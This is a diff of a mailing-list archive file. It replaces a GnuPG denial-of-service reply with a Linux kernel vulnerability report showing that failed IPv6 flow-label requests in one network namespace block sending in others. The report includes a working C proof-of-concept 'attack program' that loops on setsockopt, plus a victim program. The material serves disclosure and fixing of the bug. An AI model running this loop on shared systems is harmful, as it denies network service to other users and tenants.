@@ -1,44 +1,201 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2022/07/06/3
-Message-ID: <YsVr51JzzpR0A0N9@itl-email>
-Date: Wed, 6 Jul 2022 07:02:59 -0400
-From: Demi Marie Obenour <demi@...isiblethingslab.com>
-To: oss-security@...ts.openwall.com
-Subject: Re: Re: DO NOT OPEN PREVIOUS MAIL Re:  Denial of service in  GnuPG
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2022/02/13/1
+Message-ID:  <MWHPR2201MB1072BCCCFCE779E4094837ACD0329@MWHPR2201MB1072.namprd22.prod.outlook.com>
+Date: Sun, 13 Feb 2022 10:31:34 +0000
+From: "Liu, Congyu" <liu3101@...due.edu>
+To: "willemb@...gle.com" <willemb@...gle.com>, "security@...nel.org" <security@...nel.org>, "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>, "netdev@...r.kernel.org" <netdev@...r.kernel.org>
+Subject: Linux kernel: potential net namespace bug in IPv6 flow label management 
 Content-Type: text/plain; charset=utf-8
 
-On Wed, Jul 06, 2022 at 06:10:32AM -0000, Tavis Ormandy wrote:
-> On 2022-07-04, Jakub Wilk wrote:
-> > As a data point, if Mutt has pgp_auto_decode=yes ("automatically attempt 
-> > to decrypt traditional PGP messages") in the config, it will trigger the 
-> > DoS when you view the message.
-> 
-> Hmm - I think you don't even need auto_decode, because x-action parameters
-> can trigger automatic decryption in mutt.
-> 
-> There's an example message here: https://gitlab.com/muttmua/mutt/-/issues/405
-> 
-> > (And it seems that if you lose patience waiting for the message to show 
-> > up and press ctrl+backslash in attempt to make it quit, it will actually 
-> > hang forever.)
-> >
-> 
-> I think you need at least something like max-output 104857600 in
-> gnupg.conf if you don't want trivial DoS pranks to be possible :)
-> 
-> Tavis.
 
-I don't think this one is impacted by max-output.  Worse, I was told
-“Not a bug, sorry” by Werner.
+Hi,
 
-Was adding compression to PGP even a good idea in the first place?
-Becuase it seems to have some of the same problems that compression in
-TLS and SSH do, not to mention creating a trivial DoS.  If it were not
-for OpenPGP being an archival format I would suggest ditching it
-outright.
--- 
-Sincerely,
-Demi Marie Obenour (she/her/hers)
-Invisible Things Lab
+In the test conducted on namespace, I found that one unsuccessful IPv6 flow label 
+management from one net ns could stop other net ns's data transmission that requests 
+flow label for a short time. Specifically, in our test case, one unsuccessful 
+`setsockopt` to get flow label will affect other net ns's `sendmsg` with flow label 
+set in cmsg. Simple PoC is included for verification. The behavior descirbed above 
+can be reproduced in latest kernel.
 
-Download attachment "signature.asc" of type "application/pgp-signature" (834 bytes)
+I managed to figure out the data flow behind this: when asking to get a flow label, 
+some `setsockopt` parameters can trigger function `ipv6_flowlabel_get` to call `fl_create` 
+to allocate an exclusive flow label, then call `fl_release` to release it before returning 
+-ENOENT. Global variable `ipv6_flowlabel_exclusive`, a rate limit jump label that keeps 
+track of number of alive exclusive flow labels, will get increased instantly after calling 
+`fl_create`. Due to its rate limit design, `ipv6_flowlabel_exclusive` can only decrease 
+sometime later after calling `fl_decrease`. During this period, if data transmission function 
+in other net ns (e.g. `udpv6_sendmsg`) calls `fl_lookup`, the false `ipv6_flowlabel_exclusive` 
+will invoke the `__fl_lookup`. In the test case observed, this function returns error and 
+eventually stops the data transmission.
+
+I further noticed that this bug could somehow be vulnerable: if `setsockopt` is called 
+continuously, then `sendmmsg` call from other net ns will be blocked forever. Using the PoC 
+provided, if attack and victim programs are running simutaneously, victim program cannot transmit 
+data; when running without attack program, the victim program can transmit data normally.
+
+Thanks,
+Congyu
+
+
+
+
+Attack Program:
+
+#define _GNU_SOURCE
+#include <linux/in6.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <fcntl.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <unistd.h>
+#include <error.h>
+#include <errno.h>
+#include <sched.h>
+#include <stdbool.h>
+
+
+int main() {
+	int fd1, ret, pid;
+	unshare(CLONE_NEWNET);
+	if ((fd1 = socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDPLITE)) < 0)
+		error(1, errno, "socket");
+	struct in6_flowlabel_req req = {
+		.flr_action = IPV6_FL_A_GET,
+		.flr_label = 0,
+		.flr_flags = 0,
+		.flr_share = IPV6_FL_S_USER,
+	};
+	req.flr_dst.s6_addr[0] = 0xfd;
+ 	req.flr_dst.s6_addr[15] = 0x1;
+
+	while(1) {
+		ret = setsockopt(fd1, SOL_IPV6, IPV6_FLOWLABEL_MGR, &req, sizeof(req));
+	}
+
+	return 0;
+}
+
+
+
+Victim program:
+
+#define _GNU_SOURCE
+#include <linux/in6.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <fcntl.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <unistd.h>
+#include <error.h>
+#include <errno.h>
+#include <sched.h>
+#include <stdbool.h>
+
+static const char cfg_data[] = "a";
+
+static void do_send(int fd, struct sockaddr_in6 addr, bool with_flowlabel, uint32_t flowlabel)
+ {
+ 	char control[CMSG_SPACE(sizeof(flowlabel))] = {0};
+ 	struct msghdr msg = {0};
+ 	struct iovec iov = {0};
+ 	int ret;
+
+ 	iov.iov_base = (char *)cfg_data;
+ 	iov.iov_len = sizeof(cfg_data);
+
+ 	msg.msg_iov = &iov;
+ 	msg.msg_iovlen = 1;
+	msg.msg_name = &addr;
+	msg.msg_namelen = sizeof(addr);
+
+ 	if (with_flowlabel) {
+ 		struct cmsghdr *cm;
+
+ 		cm = (void *)control;
+ 		cm->cmsg_len = CMSG_LEN(sizeof(flowlabel));
+ 		cm->cmsg_level = SOL_IPV6;
+ 		cm->cmsg_type = IPV6_FLOWINFO;
+ 		*(uint32_t *)CMSG_DATA(cm) = htonl(flowlabel);
+
+ 		msg.msg_control = control;
+ 		msg.msg_controllen = sizeof(control);
+ 	}
+
+ 	ret = sendmsg(fd, &msg, 0);
+
+	fprintf(stderr, "sendmsg ret = %d\n", ret);
+}
+
+static void do_recv(int fd, bool with_flowlabel, uint32_t expect)
+ {
+ 	char control[CMSG_SPACE(sizeof(expect))];
+ 	char data[sizeof(cfg_data)];
+ 	struct msghdr msg = {0};
+ 	struct iovec iov = {0};
+ 	struct cmsghdr *cm;
+ 	uint32_t flowlabel;
+ 	int ret;
+
+ 	iov.iov_base = data;
+ 	iov.iov_len = sizeof(data);
+
+ 	msg.msg_iov = &iov;
+ 	msg.msg_iovlen = 1;
+
+
+ 	memset(control, 0, sizeof(control));
+ 	msg.msg_control = control;
+ 	msg.msg_controllen = sizeof(control);
+
+ 	recvmsg(fd, &msg, 0);
+}
+
+int main() {
+	int fd1, ret, pid;
+	unshare(CLONE_NEWNET);
+	pid = fork();
+	if (pid == 0) {
+		execlp("ip", "ip", "link", "set", "dev", "lo", "up", NULL);
+	}
+	sleep(1);
+	struct sockaddr_in6 src_addr = {
+ 		.sin6_family = AF_INET6,
+ 		.sin6_port = htons(7000),
+ 		.sin6_addr = in6addr_loopback,
+		.sin6_flowinfo = htonl(0),
+		.sin6_scope_id = 0,
+ 	};
+	struct sockaddr_in6 dst_addr = {
+ 		.sin6_family = AF_INET6,
+ 		.sin6_port = htons(8000),
+ 		.sin6_addr = in6addr_loopback,
+		.sin6_flowinfo = htonl(0),
+		.sin6_scope_id = 0,
+ 	};
+	pid = fork();
+	int fd2;
+	if (pid == 0) {
+		if((fd2 = socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP)) < 0)
+			error(1, errno, "socket");
+		if(bind(fd2, (void *)&dst_addr, sizeof(dst_addr)) < 0)
+			error(1, errno, "bind");
+		while(1) {
+			do_recv(fd2, true, 123456);
+		}
+		return 0;
+		
+	}
+	sleep(1);
+	if((fd2 = socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP)) < 0)
+ 		error(1, errno, "socket");
+	while(1) {
+		do_send(fd2, dst_addr, true, 123456);
+		usleep(100000);
+	}
+
+	return 0;
+}
